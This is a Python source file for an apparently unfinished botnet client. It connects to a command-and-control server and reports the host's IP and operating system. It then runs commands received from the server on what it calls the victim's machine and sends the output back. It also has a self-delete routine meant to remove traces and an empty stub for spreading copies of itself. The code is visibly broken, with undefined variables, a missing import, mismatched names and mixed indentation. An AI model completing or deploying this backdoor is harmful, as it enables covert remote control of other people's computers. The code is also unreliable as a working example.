#!/usr/bin/env python3

"""
AUTHORS: CHRIS KORTBAOUI, ALEXIS RODRIGUEZ
START DATE: 2020-04-06
END DATE: 2020-04
MODULE NAME: ______
"""

try:
	import socket 						# Import socket for creating TCP connection.
	from subprocess import PIPE, run	# Import subprocess to execute system commands.
	from os import devnull				# Import devnull from os to send stderr to devnull.
	from sys import exit				# Import exit from sys to quit program when specified.
	from platform import system         # Import system from platform to detect os.
except Exception:
    exit(1)
    
""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

FILENAME = __file__[2:]

def create_client_socket(ip_addr: str, port: int):
	"""This function creates a client socket to connect to 
		our command & control server.

		Arguments:
			ip_addr (str): The IP address of our C&C server.
			port (int): The port number of the C&C server to connect to.
		
		Returns:
			This function will return a socket object.
	"""
	client_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)     # Initializing socket.
    conn = (ip_addr, port)                                              # Connect to server IP/Port.
    sock.connect(conn)                                                  # Connection made.
    host = socket.gethostname()                                         # Get local host name in order to then get IP.
    client_ip = socket.gethostbyname(host)                              # Get local IP using host name.
    initial_message = "IP=" + client_ip + ",os=" + system()             # Send IP address and OS information.
    sock.send(initial_message.encode())                                 # Send message with this host's IP back to the server.

    return client_sock													# Return the created client socket.

def self_delete(name: str):
    """This function will be invoked when the C&C server enter's the
		keyword "self-destruct" and which will instruct the program to
		delete traces of itself.

		Arguments:
			name (str): The name of this file.
		
		Returns:
			None
	"""
	os.remove(name)             # Delete the local file to remove traces of our presence 
	print("File Deleted")       # Print a confirmation
	
def propagate(name: str):
	"""This function will create other instances of this file in 
		other directories on the victim's machines when the keyword
		"propogate" is used.

		Arguments:
			name (str): The name of this file.

		Returns:
			None
	"""

""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

class WindowsBot:
	"""This class definition will contain the functions and commands
		that are specific to the Windows operating system.
	"""
	def __init__(self):
		pass

	def exec_windows_cmd(self, commnd: str):
		"""This function will execute Windows commands requested by the C&C.
			
			Argments:
				command (str): The command that will be executed on the victim's machine.
			
			Returns:
				Will return the output of the command that was executed.
		"""
		DEVNULL = open(devnull, 'w')                    # Open devnull file to send stderr to.
		output = subprocess.run(cmd.split(),		    # Run command.
								stdout=PIPE, 			# Pipe command to store in variable.
								stderr=DEVNULL)			# Send standard error to devnull.
		return output

	def handle_request(self):
		"""This function will handle all tasks related to request made by the server.

			Arguments:
				None

			Returns:
				None
		"""
		sock = create_client_socket()					# Store socket object.
		command = sock.recv(1024).decode('utf-8')		# Receive command from server.
		command_output = self.exec_linux_cmd(command)	# Execute command on machine and store the response.
		sock.send(command_output)						# Send the output to the C&C server.
		
""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

class LinuxBot:
	"""This class definition will contain the functions and commands
		that are specific to the Linux operating system.
	"""
	def __init__(self):
	    pass

	def exec_linux_cmd(self, commnd: str):
		"""This function will execute Linux commands requested by the C&C.
			
			Argments:
				command (str): The command that will be executed on the victim's machine.
			
			Returns:
				Will return the output of the command that was executed.
		"""
		DEVNULL = open(devnull, 'w')					# Open devnull file to send stderr to.
		output = subprocess.run(cmd.split(),  			# Run command.
								stdout=PIPE, 			# Pipe command to store in variable.
								stderr=DEVNULL)			# Send standard error to devnull.

		return output

	def handle_request(self):
		"""This function will handle all tasks related to request made by the server.

			Arguments:
				None

			Returns:
				None
		"""
		sock = create_client_socket()					# Store socket object.
		command = sock.recv(1024).decode('utf-8')		# Receive command from server.
		command_output = self.exec_linux_cmd(command)	# Execute command on machine and store the response.
		sock.send(command_output)						# Send the output to the C&C server.

""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

def main():
	obj = None
    OS = system()			# Determine operating system.
	if OS == "Linux":		# Check if operating system is Linux.
		obj = LinuxBot()	# If Linux, instantiate LinuxBot object.
	else:
		obj = WindowsBot()	# Else, instantiate WindowsBot object.

	

if __name__ == '__main__':
    main()
